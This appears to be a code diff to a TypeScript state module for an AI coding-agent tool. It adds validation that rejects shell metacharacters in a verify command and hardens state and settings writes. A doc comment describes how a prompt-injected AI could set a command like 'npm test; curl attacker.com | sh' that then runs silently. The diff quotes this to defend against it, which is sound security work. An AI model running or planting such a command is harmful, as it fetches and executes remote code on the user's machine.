@@ -125,6 +125,47 @@ function getVerifyCommandFilePath(): string {
 	return join(getStateDir(), 'verify.cmd');
 }
 
+// ── Verify command sanitization ──
+
+/**
+ * Validate a verify command for safe execution. Rejects commands containing
+ * shell metacharacters that enable command chaining beyond the safe &&, ||, |.
+ *
+ * The onStop hook runs verifyCommand via execSync(cmd, { shell: true }) — this
+ * is a silent auto-verification path (unlike terminal-execute which is visible
+ * in the UI). If an AI is prompt-injected into setting a command like
+ * "npm test; curl attacker.com | sh", the malicious command would execute
+ * silently on every turn. This validation prevents that.
+ *
+ * Allowed: alphanumerics, spaces, path separators, common flags, quotes,
+ * and the three safe chaining operators (&& || |) which are legitimate for
+ * multi-step build/test commands (e.g. "npm run build && npm test").
+ *
+ * Blocked: command separators (; &), command substitution ($() ``), newlines,
+ * and background execution (&). These enable stealthy command injection.
+ *
+ * @throws Error if the command contains dangerous shell metacharacters
+ */
+export function validateVerifyCommand(cmd: string): void {
+	if (!cmd || typeof cmd !== 'string') return;
+	// Reject if any dangerous character is present:
+	// ; — command separator (allows injecting a second command)
+	// ` — backtick command substitution
+	// $ — variable/parameter expansion ($() ${})
+	// newline — command separator
+	// & (when not part of &&) — background execution
+	const hasDangerous = /[;`$]/.test(cmd) || cmd.includes('\n') || /\b&(?!\s*&)/.test(cmd);
+	if (hasDangerous) {
+		throw new Error(
+			`Verify command contains potentially dangerous shell metacharacters. ` +
+				`Rejected for security (prevents prompt-injection-driven command execution). ` +
+				`Allowed: alphanumerics, paths, flags, &&, ||, |. ` +
+				`Blocked: ; backtick $ newline & (background). ` +
+				`Command was: "${cmd.slice(0, 100)}"`,
+		);
+	}
+}
+
 // ── State operations ──
 
 export function ensureStateDir(): void {
@@ -186,6 +227,12 @@ export function loadState(): OmsState | null {
 			} catch {}
 			return null;
 		}
+		// Cache the PRD on the state object so callers can reuse it without
+		// a redundant loadPrd() disk read. The field is an internal cache,
+		// not a persisted state.json field — saveState serializes via
+		// JSON.stringify which will include it, but loadState strips it
+		// on next read since it's not part of the OmsState interface.
+		(state as OmsState & {_cachedPrd?: unknown})._cachedPrd = prd;
 		return state;
 	} catch {
 		return null;
@@ -196,6 +243,11 @@ function syncSleep(ms: number): void {
 	// Synchronous sleep used for lock-retry backoff. Atomics.wait parks the OS
 	// thread (kernel-level, no CPU burn) when SharedArrayBuffer is available;
 	// it does NOT yield the JS event loop. Falls back to a Date.now() spin.
+	//
+	// NOTE: This is intentionally duplicated in hooks/lib/oms-state.mjs — the
+	// MCP server (compiled TS) and the hook scripts (runtime .mjs) run in
+	// separate Node processes and cannot share imports. The duplication is
+	// by design, not a DRY violation to fix.
 	try {
 		Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, ms);
 	} catch {
@@ -374,7 +426,17 @@ function tmpRenameWrite(filePath: string, content: string): boolean {
  * This prevents corrupted state if the process is interrupted mid-write.
  */
 export function saveState(state: OmsState): void {
-	atomicWriteWithLock(getStateFilePath(), JSON.stringify(state, null, 2), 'skip');
+	// Strip the internal PRD cache before serializing — it's a runtime-only
+	// optimization field set by loadState, not a persisted state.json field.
+	const stateToSave = {...state};
+	delete (stateToSave as OmsState & {_cachedPrd?: unknown})._cachedPrd;
+	const written = atomicWriteWithLock(getStateFilePath(), JSON.stringify(stateToSave, null, 2), 'skip');
+	if (!written) {
+		throw new Error(
+			'Failed to write state.json — lock contention after retries (concurrent write in progress). ' +
+			'The state was NOT persisted. Re-read the current state, re-apply your changes, and retry.',
+		);
+	}
 }
 
 /**
@@ -440,6 +502,7 @@ export function deleteState(): void {
 // ── State mutations ──
 
 export function createState(goal: string, verifyCommand: string): OmsState {
+	validateVerifyCommand(verifyCommand);
 	const now = new Date().toISOString();
 	const state: OmsState = {
 		sessionId: `oms_${Date.now()}`,
@@ -540,14 +603,19 @@ export function completeTask(state: OmsState, taskId: string): OmsState {
 export function setProjectTeamMode(enabled: boolean): boolean {
 	const settingsPath = join(process.cwd(), '.snow', 'settings.json');
 
-	// Read existing settings (empty object if missing/corrupt — preserves other fields)
+	// Read existing settings (empty object if missing — preserves other fields)
 	let settings: Record<string, unknown> = {};
 	if (existsSync(settingsPath)) {
 		try {
 			settings = JSON.parse(readFileSync(settingsPath, 'utf-8')) as Record<string, unknown>;
-		} catch {
-			// Corrupt settings.json — start fresh but warn via stderr (server context)
-			settings = {};
+		} catch (error) {
+			// Corrupt settings.json — refuse to overwrite, as writing {} would destroy
+			// the user's entire configuration (MCP servers, hooks, etc.). Throw so the
+			// caller can surface the error and the user can fix settings.json manually.
+			throw new Error(
+				`settings.json is corrupt and cannot be parsed: ${(error as Error).message}. ` +
+				`Refusing to overwrite — fix or delete .snow/settings.json manually, then retry.`,
+			);
 		}
 	}
 
@@ -640,8 +708,16 @@ export function listSnapshots(
 }
 
 export function saveVerifyCommandFile(cmd: string): void {
-	ensureStateDir();
-	writeFileSync(getVerifyCommandFilePath(), cmd, 'utf-8');
+	validateVerifyCommand(cmd);
+	const filePath = getVerifyCommandFilePath();
+	const content = cmd;
+	const written = atomicWriteWithLock(filePath, content, 'force');
+	if (!written) {
+		throw new Error(
+			'Failed to write verify.cmd — lock contention after retries. ' +
+			'The verify command was NOT persisted. Retry the operation.',
+		);
+	}
 }
 
 // ── Ralph PRD management ──
@@ -1503,13 +1579,20 @@ export function requestVerification(
 /**
  * Submit an approval/rejection verdict for a verification request.
  *
- * Four-gate check (AC1.3):
+ * Five-gate check (AC1.3):
  *   1. File must exist & have a record (missing)
  *   2. requestId must match the pending token (mismatch) — anti-forge core
  *   3. Request must still be pending, not already resolved (used)
  *   4. Request must not be past TTL (expired)
  *   5. attempts must be under maxAttempts (max-attempts)
- *   6. storyId/scope must match the request (scope-mismatch)
+ *
+ * NOTE: scope cross-wiring (story-scope approval used for completion gate and
+ * vice versa) is NOT checked here — submitApproval only has the requestId,
+ * not the caller's expected scope. Scope is enforced at the GATE layer by
+ * hasMatchingApproval, which compares the caller's requested scope against
+ * the verification record's scope (R6). This keeps submitApproval's job
+ * narrow (validate the token + verdict) and centralizes scope enforcement
+ * in one place.
  *
  * On success: writes verdict + reviewerFeedback + reviewerAgentId (caller
  * attribution, AC1.12). On reject verdict: increments attempts (toward
